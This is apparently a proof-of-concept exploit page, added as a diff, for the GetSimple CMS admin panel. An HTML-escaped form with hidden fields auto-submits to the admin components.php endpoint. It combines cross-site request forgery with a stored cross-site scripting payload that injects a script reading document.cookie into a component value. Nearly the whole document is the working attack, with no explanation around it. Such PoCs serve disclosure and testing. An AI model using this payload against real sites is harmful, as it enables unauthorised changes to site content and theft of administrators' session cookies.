@@ -1,0 +1,14 @@
+&lt;form action=&quot;http://www.example.com/admin/components.php&quot; method=&quot;post&quot; name=&quot;main&quot; accept-charset=&quot;utf-8&quot; &gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;submitted&quot; value=&quot;Save Components&quot; /&gt;
+	&lt;input name=&quot;val[]&quot; type=&quot;hidden&quot; value='Some text here...&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;slug[]&quot; value=&quot;sidebar&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;title[]&quot; value=&quot;Sidebar&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;id[]&quot; value=&quot;0&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;val[]&quot; value=&quot;Just Another GetSimple Website&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;slug[]&quot; value=&quot;tagline&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;title[]&quot; value=&quot;Tagline&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;id[]&quot; value=&quot;1&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
